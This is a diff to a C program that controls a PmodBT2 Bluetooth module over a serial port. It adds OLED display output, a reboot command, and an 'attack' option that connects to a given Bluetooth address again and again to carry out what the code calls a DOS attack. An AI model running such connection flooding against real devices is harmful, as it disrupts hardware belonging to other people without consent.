@@ -8,6 +8,7 @@
 #include <argp.h>
 #include <signal.h>
 #include <pthread.h>
+#include <oledDisplay.h>
 
 /**
  * Defines for developing
@@ -15,17 +16,14 @@
 #define DEBUG 
 #define RELEASE 
 
-
 /** Variable for detecting CTRL-C */
 
 static volatile int keep_running = 1;
-
 
 /**
  * Declarations specific argp (program arguments and specs)
  */
 int COMMAND_MODE = 0;
-
 
 static error_t parse_opt(int key, char *arg, struct argp_state *state);
 
@@ -38,7 +36,9 @@ static char args_doc[] = "";
 static struct argp_option options[] = { 
     { "uart", 'u', 0, 0, "Simple comunication with the connected bluetooth device or with the PMOD."},
     { "connect", 'c', "[Bluetooth Address]", 0, "Connect to given bluetooth address. The address must be provided in the following format [11:22:33:44:55:66]\n"},
+    { "attack", 'a', "[Bluetooth Address]", 0, "Try to make a DOS attack at given bluetooth address. he address must be provided in the following format [11:22:33:44:55:66]\n"},
     { "disconnect", 'd', 0, 0, "Disconnect the device."},
+    { "restart", 'r', 0, 0, "Reboot device."},
     { "exitCMDmode", 'e', 0, 0, "Exit CMD mode."},
     { 0 } 
 };
@@ -49,6 +49,8 @@ struct arguments {
         DISCONNECT,
         COMMUNICATE,
         EXITCMDMODE,
+        REBOOT,
+        ATTACK,
         UNSET
     } mode;
     char* ble_address;
@@ -123,6 +125,8 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
     case 'u': arguments->mode = COMMUNICATE; break;
     case 'e': arguments->mode = EXITCMDMODE; break;
     case 'd': arguments->mode = DISCONNECT; break;
+    case 'r': arguments->mode = REBOOT; break;
+    case 'a': arguments->ble_address = arg; arguments->mode = ATTACK; break;
     case 'c': arguments->ble_address = arg; arguments->mode = CONNECT; break;
     case ARGP_KEY_ARG: return 0;
     default: return ARGP_ERR_UNKNOWN;
@@ -205,7 +209,6 @@ void set_blocking(int fd) {
     if (tcsetattr(fd, TCSANOW, &tty) != 0)
         printf("Error %d while setting device attributes! (\"set_blocking::tcsetattr\")\n", errno);
 }
-
 
 /**
  * Function: send_message_to_device
@@ -314,6 +317,22 @@ int exit_device_cmd_mode(int device_descriptor) {
         return 0;
     }
     free(recv_buffer);
+    return 1;
+}
+
+/**
+ * Function: restart_device
+ * ----------------------------
+ *  Restart the device.
+ * 
+ *      @param[in] device_descriptor File descriptor of serial device
+ * 
+ *      @example R,1<cr> -> should echo 1,0,0 if connected
+ */
+
+int restart_device(int device_descriptor) {
+    char cmd_buffer[] = {'R', ',', '1', 0x0D};
+    int sent_bytes = send_message_to_device(device_descriptor, cmd_buffer, 4);
     return 1;
 }
 
@@ -456,6 +475,8 @@ int get_connected_address(int device_descriptor, char* recv_buffer) {
     return recv_size;
 }
 
+
+
 /**
  * Function: thread_pooling_module
  * ----------------------------
@@ -474,16 +495,51 @@ void* thread_pooling_module(void* args) {
     int device_descriptor = *(int*)args;
     char* pmod_buffer = calloc(256, sizeof(char));
 
+    int oled_file = open("/dev/zed_oled", O_RDWR | O_NOCTTY | O_SYNC);
+    int rounded_recv_bytes = 0;
+    char buffer[512];
+    int count = 0;
+
+
     while(1) {
 
         //Sleep 
+        count = 0;
         usleep(100000);
         int recv_bytes = read(device_descriptor, pmod_buffer, 256);  // Read up to 256 characters if ready to read 
+
+
+
         if(recv_bytes > 0) {
+
             pmod_buffer[recv_bytes] = 0;
             printf("\nPmodBT2 Responded > %s", pmod_buffer);
+
+
+            if(recv_bytes%16 != 0) {
+                rounded_recv_bytes = ((recv_bytes/16) + 1) * 16;
+                for(int i = recv_bytes; i< rounded_recv_bytes; i++) {
+                    pmod_buffer[i] = 0x20;
+                }
+                recv_bytes = rounded_recv_bytes;
+            }
+
+
+            for(int i = 15; i <= recv_bytes; i+=16) {
+                for(int j = i; j > i - 16; j--) {
+                    memcpy(buffer + (count*8), oledAsciiMatrix[pmod_buffer[j]], 8);
+                    count++;
+                }
+            }
+
+            for(int i = count*8; i< 512; i++)
+                buffer[i] = 0;
+
+            write(oled_file, buffer, 512);
+
         }
     }
+    close(oled_file);
 
 }
 
@@ -570,6 +626,47 @@ int main(int argc, char* argv[]) {
 
         #endif
 
+
+    }
+
+    /** Try to make a DOS attack against a given device */
+
+    if(arguments.mode == ATTACK && arguments.ble_address) {
+
+        int valid_mac_address = is_valid_mac_address(arguments.ble_address, arguments.formatted_mac);
+
+        arguments.ble_address++;
+
+        #ifdef DEBUG
+
+            printf("DEBUG: The given mac addres is %s\n", valid_mac_address\
+                == 0 ? "Invalid or it does not respect the requested format [11:22:33:44:55:66]" : "Valid" );
+            printf("DEBUG: Given bluetooth address is %s\n", arguments.ble_address);
+            printf("DEBUG: Formatted bluetooth address is %s\n", arguments.formatted_mac);
+
+        #endif
+
+        #ifdef RELEASE
+
+            if(!enter_device_cmd_mode(device_descriptor)) {
+
+                /** Function to start the attack  */
+
+                printf("Attack on %s will start...\n", arguments.ble_address);
+
+                while(keep_running) {
+                    connect_to_ble_address(device_descriptor, arguments.formatted_mac);
+                }
+
+                exit_device_cmd_mode(device_descriptor);
+
+
+                printf("Attack has been stopped...\n", arguments.ble_address);
+
+            }
+
+        #endif
+
     }
 
     /** Disconnect from any ble device that is connected */
@@ -602,6 +699,19 @@ int main(int argc, char* argv[]) {
         #endif
     }
 
+    /** Restart device */
+
+    if(arguments.mode == REBOOT) { 
+        #ifdef RELEASE
+            printf("Restarting device..\n");
+            if(!enter_device_cmd_mode(device_descriptor)) {
+                #ifdef DEBUG
+                    printf("DEBUG: Device has entereed comand mode succesfully!\n");
+                #endif
+                restart_device(device_descriptor);
+            }
+        #endif
+    }
 
     /** Communicate with the other device, something like a pipe */
 
